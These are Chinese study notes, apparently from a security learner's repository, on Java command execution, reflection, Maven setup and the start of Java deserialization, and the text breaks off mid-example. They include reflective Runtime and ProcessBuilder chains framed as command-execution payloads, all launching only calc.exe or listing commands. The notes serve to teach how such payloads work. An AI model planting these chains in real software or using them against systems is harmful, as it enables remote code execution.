[TOC]

### 命令执行

最基本的 java中的命令执行

```Java
import java.io.IOException;

public class Calc {
    //当前执行命令无回显
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

>`Runtime`类表示运行时环境，并提供与运行时环境交互的方法：
>
>1. `exec(String command)`: 用于在系统的命令行执行指定的命令。
>2. `exec(String[] cmdarray)`: 用于在系统的命令行执行指定的命令，参数作为字符串数组传递。
>3. `exec(String command, String[] envp)`: 用于在系统的命令行执行指定的命令，并指定环境变量。
>4. `exec(String[] cmdarray, String[] envp)`: 用于在系统的命令行执行指定的命令，参数作为字符串数组传递，并指定环境变量。
>5. `exit(int status)`: 用于终止当前 Java 虚拟机。
>6. `freeMemory()`: 该方法用于返回Java虚拟机中的空闲内存量，以字节为单位。
>7. `maxMemory()`: 该方法用于返回Java虚拟机试图使用的最大内存量。
>8. `totalMemory()`: 该方法用于返回Java虚拟机中的内存总量。
>9. `availableProcessors()` : 返回虚拟机的处理器数量
>
>`Runtime`无法直接new 所以使用这个创建对象：`Runtime runtime = Runtime.getRuntime();`
>
>其中，最常用的方法是 `exec()` 方法，它允许你在 Java 程序中执行外部命令，`exec()`方法返回一个 `Process` 对象
>
>`Process` 类提供了以下方法来与子进程交互：
>
>1. `InputStream getInputStream()`: 获取子进程的标准输出流。
>2. `InputStream getErrorStream()`: 获取子进程的错误输出流。
>3. `OutputStream getOutputStream()`: 获取子进程的标准输入流。
>4. `int waitFor()`: 等待子进程执行完成并返回子进程的退出值。
>5. `int exitValue()`: 获取子进程的退出值（仅在子进程执行完成后才可调用）。

如果需要回显要用IO流将命令执行后的字节加载出来，然后最基本的按行读取，就可以了。

在进行网站开发入JSP的时候，我们使用的JSP一句话木马也是根据这个原理进行编写的。

```Java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) throws IOException {
        Process p = Runtime.getRuntime().exec("whoami");
        InputStream is = p.getInputStream();
        InputStreamReader isr = new InputStreamReader(is, "GBK");
        BufferedReader ibr = new BufferedReader(isr);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while((line = ibr.readLine()) != null){
            sb.append(line);
            System.out.println(line);
        }
        is.close();
        isr.close();
        ibr.close();
        is = null;
        isr = null;
        ibr = null;
    }
}
```

>四个模块：
>
>1. `java.io.IOException`: 这是 Java 的输入输出操作中最常见的异常类。它表示在进行输入和输出操作时可能出现的错误情况，例如文件不存在、权限问题、设备错误等。当执行输入输出操作时，如果发生异常，就可以通过捕获 `IOException` 异常来处理这些错误情况。
>2. `java.io.InputStream`: 这是一个字节输入流类，它是所有输入流的抽象基类。`InputStream` 用于从输入源（例如文件、网络连接、字节数组等）读取字节数据。它提供了 `read()` 方法用于读取单个字节，以及其他相关的方法用于读取多个字节数据。
>3. `java.io.InputStreamReader`: 这是一个字符输入流类，它是 `Reader` 类的子类。`InputStreamReader` 可以将字节输入流（`InputStream`）转换为字符输入流，从而可以方便地读取文本数据。它提供了和 `Reader` 类相似的方法，例如 `read()` 方法用于读取单个字符。
>4. `java.io.BufferedReader`: 这是一个字符缓冲输入流类，它继承自 `Reader` 类。`BufferedReader` 可以从字符输入流中读取文本数据，并以缓冲方式提高读取效率。它提供了 `readLine()` 方法用于逐行读取文本数据，常用于读取文本文件内容等场景。
>5. `StringBuilder` 是一个可变的字符串类，用于构建和修改字符串。用于处理大量字符串拼接和修改操作，避免频繁创建新的字符串对象，提高字符串处理性能。
>
>这些模块常常一起使用，例如在读取文本文件的场景中，可以使用 `FileInputStream`（字节输入流）读取文件的字节数据，然后通过 `InputStreamReader` 将字节数据转换为字符数据，最后再使用 `BufferedReader` 逐行读取字符数据。通过这种方式，可以高效地读取文本文件的内容，并处理可能出现的异常情况。

在不同的操作系统下，执行的命令的方式也是不一样的

#### Windows下

Windows下一班都会用`cmd`或者`powershell`去执行命令，但是powershell一般默认会限制执行策略，所以一般用`cmd`

```Java
String[] payload = {"cmd", "/c", "dir"};
Process p = Runtime.getRuntime().exec(payload);
```

#### Linux下

Linux一般使用`bash`执行命令，通常情况下是会有的，但是有的情况，可能没有bash，我们就可以使用`sh`来进行替代

```
String [] payload={"/bin/sh","-c","ls"}; 
Process p = Runtime.getRuntime().exec(payload);
```

>以下是一些常见 Shell 的二进制文件和对应的命令执行方式：
>
>1. Bash：
>   - 二进制文件路径：/bin/bash
>   - 命令执行方式：直接在终端中输入命令。
>2. Zsh：
>   - 二进制文件路径：/bin/zsh
>   - 命令执行方式：直接在终端中输入命令。
>3. Fish：
>   - 二进制文件路径：/usr/bin/fish
>   - 命令执行方式：在终端中使用 `fish -c 'command'` 的方式执行命令。
>4. Sh 或 Dash：
>   - 二进制文件路径：/bin/sh 或 /bin/dash（取决于系统配置）
>   - 命令执行方式：在终端中使用 `sh -c 'command'` 或 `dash -c 'command'` 的方式执行命令。

根据不同主机进行甄别：使用`getProperty`函数获取操作系统的名称

```Java
// System.getProperty("os.name");
System.out.println("操作系统：" + System.getProperty("os.name"));
// 操作系统：Windows 10
```

完整payload：

```Java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) throws IOException {
        String sys = System.getProperty("os.name");
        String[] payload = null;
        System.out.println("操作系统：" + sys);
        if (sys.contains("Window")){
            String[] payloadCmd = {"cmd", "/c", "dir"};
            payload = payloadCmd.clone();
        }else{
            String[] payloadSh = {"/bin/sh", "-c", "ls"};
            payload = payloadSh.clone();
        }

        Process p = Runtime.getRuntime().exec(payload);
        InputStream is = p.getInputStream();
        InputStreamReader isr = new InputStreamReader(is, "GBK");
        BufferedReader ibr = new BufferedReader(isr);
        StringBuilder sb = new StringBuilder();
        String line = null;
        while((line = ibr.readLine()) != null){
            sb.append(line);
            System.out.println(line);
        }
        is.close();
        isr.close();
        ibr.close();
        is = null;
        isr = null;
        ibr = null;
    }
}
```

### 反射

[Java 类的初始化顺序 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/122554857)

Java有四个基本特征：封装，继承，多态，抽象

Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。本质上其实就是动态的生成类似于上述的字节码，加载到jvm中运行

1. Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。
2. Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。
3. 反射调用方法时，会忽略权限检查，可以无视权限修改对应的值，因此容易导致安全性问题，（对安全研究人员来说提供了不小的帮助，hhhh）

这样⼀段代码，在你不知道传⼊的参数值 的时候，你是不知道他的作⽤是什么的：

```Java
public void execute(String className, String methodName) throws Exception {
    Class clazz = Class.forName(className);
 	clazz.getMethod(methodName).invoke(clazz.newInstance());
}
```

- 获取类的⽅法： `forName` 
- 实例化类对象的⽅法： `newInstance` 
- 获取函数的⽅法： `getMethod` 
- 执⾏函数的⽅法： `invoke`

#### 反射机制原理

反射机制的原理基础是理解Class类，类是java.lang.Class类的实例对象，而Class是所有的类的类。对于普通的对象，我们在创建实例的时候通常采用如下方法：

```java
Demo test = new Demo();
```

那么我们在创建class类的实例对象时是否可以同样用上面的方法创建呢

```java
Class c = new Class()；
```

答案是不行的，所以我们查看一下Class的源码，发现他的构造器是私有的，这意味着只有JVM可以创建Class的对象。
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230722003643653.png)

反射机制原理就是把Java类中的各种成分映射成一个个的Java对象，所以我们可以在运行时调用类中的所有成员（变量、方法）。下图是反射机制中类的加载过程：
![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/v2-12ed9f48c94e5e2a3c63b2ed9bc964b9_r.jpg)

#### 反射机制操作



> [通俗易懂的双亲委派机制_IT烂笔头的博客-CSDN博客](https://blog.csdn.net/codeyanbao/article/details/82875064)
>
> 1. 如果一个类加载器收到了类加载请求，它并不会自己先加载，而是把这个请求委托给父类的加载器去执行
> 2. 如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的引导类加载器；
>
> 3. 如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委派机制
>
> 4. 父类加载器一层一层往下分配任务，如果子类加载器能加载，则加载此类，如果将加载任务分配至系统类加载器也无法加载此类，则抛出异常
>    ![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NvZGV5YW5iYW8=,size_16,color_FFFFFF,t_70.png)

##### 获取Class对象

有三种方式获得一个Class对象

1. 通过调用一个普通的其他类的`getClass()`方法获得Class对象
2. 任何数据类型（包括基本数据类型）都有一个“静态”的Class属性，所以直接调用.class属性获得Class对象
3. 调用Class类的forName方法，获得Class的对象

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230722003946555.png)

##### 获取成员方法Method

得到该类所有的方法，不包括父类的：
`public Method getDeclaredMethods() `

得到该类所有的public方法，包括父类的：
`public Method getMethods()`

>获取当前类指定的成员方法时，
>
>`Method method = class.getDeclaredMethod("方法名");`
>`Method[] method = class.getDeclaredMethod("方法名", 参数类型如String.class，多个参数用,号隔开);`

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230722005912022.png)

执行方法：`Process process = (Process) runtimeMethod.invoke(runtimeInstance, "calc");`

>###### `invoke()`方法
>
>`method.invoke(方法实例对象, 方法参数值，多个参数值用","隔开);`
>
>如果这个方法是一个普通方法，那么第一个参数是类对象，如果这个方法是一个静态方法，那么第一个参数是类。
>
>1. `invoke()`就是调用类中的方法，最简单的用法是可以把方法参数化`invoke(class, args)`
>    这里则是使用了` class.invoke(method,“参数”)`的一个方式
>2. 还可以把方法名存进数组`v[]`,然后循环里`invoke(test,v[i])`,就顺序调用了全部方法

##### 获取构造函数Constructor

获得该类所有的构造器，不包括其父类的构造器
`public Constructor<T> getDeclaredConstructors() `

获得该类所有public构造器，包括父类
`public Constructor<T> getConstructors() `

>###### `newInstance()`方法
>
>`class.newInstance()`的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用`newInstance`总是不成功，这时候原因可能是：
>
>1.  你使用的类没有无参构造函数 
>2.  你使用的类构造函数是私有的
>
>最最最常见的情况就是`java.lang.Runtime`，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：
>
>```
>Class clazz = Class.forName("java.lang.Runtime");
>clazz.getMethod("exec", String.class).invoke(clazz.newInstance(), "id");
>```
>
>你会得到这样一个错误：
>
>![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230728171457674.png)
>
>原因是 Runtime 类的构造方法是私有的。
>
>原因是`Runtime`类的构造方法是私有的。 有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：
>
>```
>public class TrainDB {
>private static TrainDB instance = new TrainDB();
>public static TrainDB getInstance() {
>return instance;
>}
>private TrainDB() {
>// 建立连接的代码...
>}
>}
>```
>
>这样，只有类初始化的时候会执行一次构造函数，后面只能通过`getInstance`获取这个对象，避免建 立多个数据库连接。 回到正题，`Runtime`类就是单例模式，我们只能通过`Runtime.getRuntime()`来获取到`Runtime`对 象。我们将上述Payload进行修改即可正常执行命令了：
>
>```
>Class clazz = Class.forName("java.lang.Runtime");
>clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe");
>```
>
>
>
>```
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
>```
>
>ProcessBuilder有两个构造函数：
>
>`public ProcessBuilder(List command)`
>`public ProcessBuilder(String... command)`
>
>我上面用到了第一个形式的构造函数，所以我在`getConstructor`的时候传入的是`List.class`。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表 达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。 
>
>```Java
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
>```
>
>通过`getMethod("start")`获取到`start`方法，然后`invoke`执行，`invoke`的第一个参数就是 ProcessBuilder Object了。
>
>那么，如果我们要使用`public ProcessBuilder(String... command)`这个构造函数，需要怎样用反 射执行呢？
>
>这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 ... 这样的语法来表示“这个函数的参数个数是可变 的”。
>
>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的（也就不能重载）：
>
>```
>public void hello(String[] names) {}
>public void hello(String... names) {}
>```
>
>也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：
>
>```
>String[] names = {"hello", "world"};
>hello(names);
>```
>
>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。
>
>所以，我们将字符串数组的类`String[].class`传给`getConstructor`，获取`ProcessBuilder`的第二构造函数：
>
>```Java
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>clazz.getConstructor(String[].class)
>```
>
>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：
>
>```Java
>Class clazz = Class.forName("java.lang.ProcessBuilder");
>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();
>```
>
>按反射来写的话就是：
>
>```java
>Class<?> clazz = Class.forName("java.lang.ProcessBuilder");     clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
>```
>
>```Java
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance((Object[]) new String[]{"calc.exe"}));
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
>// 以上两种形式都能够运行，但是下面的格式就不能运行
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[]{"calc.exe"}));
>/*
>报错信息为
>Exception in thread "main" java.lang.IllegalArgumentException: argument type mismatch
>at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
>at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
>at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
>at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
>at Main.main(Main.java:115)
>*/
>```
>
>原因：
>
>这个问题是因为Java的反射API在处理数组类型参数时的特性。
>
>在Java中，数组也是对象，`String[]`和`String[][]`是两种不同的类型，不能互相转换。`String[]`是字符串数组，`String[][]`是字符串数组的数组（也可以理解为二维数组）。
>
>在代码中，`clazz.getConstructor(String[].class)`是寻找一个接受字符串数组作为参数的构造函数。因此，你需要传递一个字符串数组的实例给`newInstance()`方法。
>
>在你的第一段代码中，你创建了一个字符串数组`new String[]{"calc.exe"}`，并将其转换为`Object[]`，这是正确的，因此代码可以运行。
>
>在你的第二段代码中，你创建了一个字符串数组的数组`new String[][]{{"calc.exe"}}`，然后直接传递给`newInstance()`方法。这也是正确的，因为`newInstance()`方法接受的是一个`Object...`类型的参数，这意味着它可以接受任何数量和类型的参数。在这种情况下，你的字符串数组的数组被视为一个单独的参数，因此代码可以运行。
>
>然而，在你的第三段代码中，你创建了一个字符串数组`new String[]{"calc.exe"}`，然后直接传递给`newInstance()`方法。这是错误的，因为`newInstance()`方法期望一个字符串数组的实例，而你提供的是一个字符串数组。这就像尝试将一个`String[]`类型的对象传递给一个期望`String[][]`类型的参数，显然是不匹配的，因此你得到了`IllegalArgumentException: argument type mismatch`的错误。
>
>更详细地解释一下。
>
>在Java中，方法和构造函数的参数都是静态的，也就是说，它们在编译时就已经确定了。当你使用反射API来调用一个方法或构造函数时，你需要提供一个与原始参数类型完全匹配的参数列表。
>
>当你调用`clazz.getConstructor(String[].class)`时，你正在寻找一个接受单个参数的构造函数，这个参数的类型是`String[]`。这意味着，当你调用`newInstance()`方法时，你需要提供一个`Object[]`，这个数组包含一个`String[]`对象。
>
>在你的第一段代码中：
>
>```java
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance((Object[]) new String[]{"calc.exe"}));
>```
>
>你创建了一个字符串数组`new String[]{"calc.exe"}`，然后将其转换为`Object[]`。这是正确的，因为`newInstance()`方法期望一个`Object[]`，这个数组包含一个`String[]`对象。因此，这段代码可以正确运行。
>
>然而，在你的第三段代码中：
>
>```java
>clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[]{"calc.exe"}));
>```
>
>你创建了一个字符串数组`new String[]{"calc.exe"}`，然后直接传递给`newInstance()`方法。这是错误的，因为`newInstance()`方法期望一个`Object[]`，这个数组包含一个`String[]`对象，而你提供的是一个`String[]`对象。这就像尝试将一个`String[]`类型的对象传递给一个期望`Object[]`类型的参数，显然是不匹配的，因此你得到了`IllegalArgumentException: argument type mismatch`的错误。
>
>为了解决这个问题，你需要将你的字符串数组包装在一个`Object[]`里，就像你在第一段代码中那样。这样，你就可以正确地调用`newInstance()`方法，而不会得到任何错误。
>
>
>
>```java
>    public static void main(String[] args) throws Exception {
>        printNumbers(new int[]{1,2,3});
>        printNumbers(1,2,3);
>    }
>
>    public static void printNumbers(int... numbers) {
>        System.out.println("The numbers are:");
>        for (int num : numbers) {
>            System.out.print(num + " ");
>        }
>        System.out.println();
>    }
>// 上述两种写法等价，int... numbers 等同于一个int数组，当传入多个int参数时会自动转换为int数组，如果传入int数组则直接使用int数组内数据
>```
>
>
>
>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();有佬知道为什么newinstance接受的是二维数组么
>这个问题解释：
>因为newInstance接受一个可变长参数也就是接受一个数组，你传进去的二维数组字符串数组的数组被视为一个单独的参数，举例就是传进去两个int参数1,2的话到nerInstance函数里面也会被编译成被一个Object数组包围的两个int类型参数，new Object[]{1, 2}，穿进去的二维数组外面这层被当做Object数组了，里面包围着字符串数组参数



>###### `getDeclaredConstructor()` 方法的语法如下：
>
>`public Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes) throws NoSuchMethodException`
>
>- `parameterTypes` 是一个可变参数列表，用于指定构造函数的参数类型。如果构造函数有参数，需要指定参数类型，如果没有参数，可以不传入该参数。
>- `T` 是构造函数所在类的类型。
>
>```Java
>Class<?> stuClass = Class.forName("student");
>//带有参数的构造函数
>Constructor<?> stuConstr = stuClass.getDeclaredConstructor(String.class, int.class);
>Object stuIns = stuConstr.newInstance("小王", 1);
>//无参构造函数
>Constructor<?> noStuConstr = stuClass.getDeclaredConstructor();
>Object noStuIns = noStuConstr.newInstance();
>```
>

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230722135218913.png)

`getDeclaredConstructor()`可以获得构造方法，也可以获得我们常用的`private`方法，其中`Runtime`的构造方法是`private`，我们无法直接调用，我们需要使用反射去修改方法的访问权限（使用`setAccessible`，修改为 true），再通过获取的构造器进行实例化对象

```Java
Class<?> runtimeClass = Class.forName("java.lang.Runtime");
Constructor constructor = runtimeClass.getDeclaredConstructor();
System.out.println(constructor);
constructor.setAccessible(true);
// Object类是所有类的父类，有兴趣的同学可以在双亲委派机制中去搞明白
Object runtimeInstance = constructor.newInstance();
//这里的话就等价于 Runtime rt = new Runtime();
```

##### 获取成员变量Field

获得该类自身声明的所有变量，不包括其父类的变量
`public Field getDeclaredFields() `

获得该类自所有的public成员变量，包括其父类变量
`public Field getFields()`

```Java
 // 获取类中的成员变量
 Field[] steFies = stuClass.getDeclaredFields();
 // 获取类中制定的成员变量
 Field stuFie = stuClass.getDeclaredField("id");
 // 设置成员变量为可访问状态
 stuFie.setAccessible(true);
 // 获取成员变量的值
 Object stuId = stuFie.get(stuIns);
 System.out.println(stuId);
 // 修改成员变量的值
 stuFie.set(stuIns, 2);
 Object stuIdNew = stuFie.get(stuIns);
 System.out.println(stuIdNew);
```

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230722141131662.png)

上述的完整Payload:

```Java
import java.io.IOException;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException {
        System.out.println("1".getClass());
        System.out.println(people.class);
        System.out.println(Class.forName("java.lang.Runtime"));
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        Class<?> studentClass = Class.forName("student");
        Method[] studentMethodAll = studentClass.getDeclaredMethods();
        Method[] studentMethod = studentClass.getMethods();

        System.out.println(studentClass + " -> getDeclaredMethods");
        for (Method m : studentMethodAll) {
            System.out.println(m);
        }
        System.out.println("\n" + studentClass + " -> getMethods");
        for (Method m : studentMethod) {
            System.out.println(m);
        }
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        Constructor[] studentConstructorAll = studentClass.getDeclaredConstructors();
        Constructor[] studentConstructor = studentClass.getConstructors();
        System.out.println(studentClass + " -> getDeclaredConstructors");
        for (Constructor m : studentConstructorAll) {
            System.out.println(m);
        }
        System.out.println("\n" + studentClass + " -> getConstructors");
        for (Constructor m : studentConstructor) {
            System.out.println(m);
        }
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        Field[] studentFieldAll = studentClass.getDeclaredFields();
        Field[] studentField = studentClass.getFields();
        System.out.println(studentClass + " -> getDeclaredFields");
        for (Field m : studentFieldAll) {
            System.out.println(m);
        }
        System.out.println("\n" + studentClass + " -> getFields");
        for (Field m : studentField) {
            System.out.println(m);
        }
        System.out.println("\n\n---------------------------------------------------------------------------------\n\n");

        try{
            Class<?> runtimeClass = Class.forName("java.lang.Runtime");
            Constructor constructor = runtimeClass.getDeclaredConstructor();
            System.out.println(constructor);
            constructor.setAccessible(true);
            // Object类是所有类的父类，有兴趣的同学可以在双亲委派机制中去搞明白
            Object runtimeInstance = constructor.newInstance();
            //这里的话就等价于 Runtime rt = new Runtime();
            // 使用 Runtime 实例调用方法
            Method execMethod = runtimeClass.getDeclaredMethod("exec", String.class);
            Process result = (Process)execMethod.invoke(runtimeInstance, "calc.exe");

            String[] payload = {"cmd", "/c", "dir"};
            Method runtimeMethod = runtimeClass.getMethod("exec", String[].class);
            Process process = (Process) runtimeMethod.invoke(runtimeInstance, (Object) payload);

            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader =  new InputStreamReader(inputStream, "GBK");
            BufferedReader inputBufferedReader = new BufferedReader(inputStreamReader);
            String line = null;
            while ((line = inputBufferedReader.readLine()) != null) {
                System.out.println(line);
            }
            inputBufferedReader.close();
            inputStreamReader.close();
            inputStream.close();

            // 获取成员变量
            Class<?> stuClass = Class.forName("student");
            // 带有参数的构造函数
            Constructor<?> stuConstr = stuClass.getDeclaredConstructor(String.class, int.class);
            Object stuIns = stuConstr.newInstance("小王", 1);
            // 无参构造函数
            Constructor<?> noStuConstr = stuClass.getDeclaredConstructor();
            Object noStuIns = noStuConstr.newInstance();

            // 获取类中的成员变量
            Field[] steFies = stuClass.getDeclaredFields();
            // 获取类中制定的成员变量
            Field stuFie = stuClass.getDeclaredField("id");
            // 设置成员变量为可访问状态
            stuFie.setAccessible(true);
            // 获取成员变量的值
            Object stuId = stuFie.get(stuIns);
            System.out.println(stuId);
            // 修改成员变量的值
            stuFie.set(stuIns, 2);
            Object stuIdNew = stuFie.get(stuIns);
            System.out.println(stuIdNew);

        }catch (NoSuchMethodException | InvocationTargetException | InstantiationException | IllegalAccessException |
                IOException | NoSuchFieldException e) {
            throw new RuntimeException(e);
        }

    }
    public void execute(String className, String methodName) throws Exception {
        Class<?> clazz = Class.forName(className);
        clazz.getMethod(methodName).invoke(clazz.newInstance());
    }
}

class people {
    public String name = null;

    public people(){}

    public people(String name){
        this.name = name;
    }

    public void shout(){
        System.out.println(this.name+": 啊啊啊啊啊啊啊啊啊啊啊！！");
    }
}

class student extends people{

    private int id;
    public int num;

    public student(){
        System.out.println("无参构造");
    }

    private student(String name){
        System.out.println("私有构造：" + name);
    }
    public student(String name, int id) {
        super(name);
        this.id = id;
        System.out.println("正常构造");
    }

    private void copyHomework(){
        System.out.println("抄抄抄！！");
    }

    public void study(){
        System.out.println("学学学！！");
    }
}
```

### Maven的使用

>IDEA自带mavan路径`IDEA安装路径\plugins\maven\lib\maven3\bin`

#### 换仓库

将仓库改成阿里云的镜像仓库

打开maven里的conf文件，打开setings.xml文件，将下面mirror标签整体复制到mirrors标签的内部。

```xml
<mirrors>
    <mirror>
        <id>nexus-aliyun</id>
        <mirrorOf>central</mirrorOf>
        <name>Nexus aliyun</name>
        <url>http://maven.aliyun.com/nexus/content/groups/public</url>
    </mirror>
</mirrors>
```

maven有三种仓库，分为：本地仓库、第三方仓库（私服）、中央仓库

Maven中的坐标使用三个『向量』在『Maven的仓库』中唯一的定位到一个『jar』包。

- **groupId**：公司或组织的 id，即公司或组织域名的倒序，通常也会加上项目名称

  例如：groupId：com.javatv.maven

- **artifactId**：一个项目或者是项目中的一个模块的 id，即模块的名称，将来作为 Maven 工程的工程名

  例如：artifactId：auth

  **version**：版本号

- 例如：version：1.0.0

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101142628470.png)

#### pom.xml

pom.xml 配置文件就是 Maven 工程的核心配置文件

```xml
<!-- 当前Maven工程的坐标 -->
<groupId>com.example</groupId>
<artifactId>demo</artifactId>
<version>0.0.1-SNAPSHOT</version>
<name>demo</name>
<description>Demo project for Spring Boot</description>
<!-- 当前Maven工程的打包方式，可选值有下面三种： -->
<!-- jar：表示这个工程是一个Java工程  -->
<!-- war：表示这个工程是一个Web工程 -->
<!-- pom：表示这个工程是“管理其他工程”的工程 -->
<packaging>jar</packaging>
<properties>
    <!-- 工程构建过程中读取源码时使用的字符集 -->
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
</properties>
<!-- 当前工程所依赖的jar包 -->
<dependencies>
    <!-- 使用dependency配置一个具体的依赖 -->
    <dependency>
        <!-- 在dependency标签内使用具体的坐标依赖我们需要的一个jar包 -->
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.12</version>
        <!-- scope标签配置依赖的范围 -->
        <scope>test</scope>
    </dependency>
</dependencies>

```

依赖

引入依赖存在一个范围，maven的依赖范围包括： `compile`，`provide`，`runtime`，`test`，`system`。

*   **compile**：表示编译范围，指 A 在编译时依赖 B，该范围为**默认依赖范围**。编译范围的依赖会用在编译，测试，运行，由于运行时需要，所以编译范围的依赖会被打包。
*   **provided**：provied 依赖只有当 jdk 或者一个容器已提供该依赖之后才使用。provide 依赖在编译和测试时需要，在运行时不需要。例如：servlet api被Tomcat容器提供了。
*   **runtime**：runtime 依赖在运行和测试系统时需要，但在编译时不需要。例如：jdbc 的驱动包。由于运行时需要，所以 runtime 范围的依赖会被打包。
*   **test**：test 范围依赖在编译和运行时都不需要，只在测试编译和测试运行时需要。例如：Junit。由于运行时不需要，所以 test 范围依赖不会被打包。
*   **system**：system 范围依赖与 provide 类似，但是必须显示的提供一个对于本地系统中 jar 文件的路径。一般不推荐使用。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101142904364.png)

命令

- clean：清理
- compile：编译
- test：运行测试
- package：打包

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101143856438.png)

> maven项目的项目目录
> ![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/20201204225021484.png)

### 反序列化

#### Java中的反序列化

Java 序列化是把Java对象转换为字节序列的过程；而Java反序列化是把字节序列恢复为Java对象的过程。

与PHP不同的是，Java序列化转化的字节序列不是明文，和Python序列化的数据一样不能够直接可读。

要使一个Java对象可序列化，需要满足以下条件：

1. 类必须实现`java.io.Serializable`接口，该接口是一个标记接口，没有任何方法。
2. 所有非序列化的字段必须标记为`transient`关键字，表示不参与序列化。

`Serializable`用来标识当前类可以被`ObjectOutputStream`序列化，以及被`ObjectInputStream`反序列化。

序列化与反序列化当中有两个 **"特别特别特别特别特别"**重要的方法 ————`writeObject`和`readObject`。这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。

![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20231101144356805.png)

只要服务端反序列化数据，客户端传递类的`readObject`中代码会自动执行，基于攻击者在服务器上运行代码的能力。所以从根本上来说，Java 反序列化的漏洞的与`readObject`有关。

实例：

```java
import java.io.*;

class Person implements Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public int getAge() {
        return age;
    }
}

public class SerializationExample {
    public static void main(String[] args) {
        // 序列化对象
        Person person = new Person("John", 30);
        try {
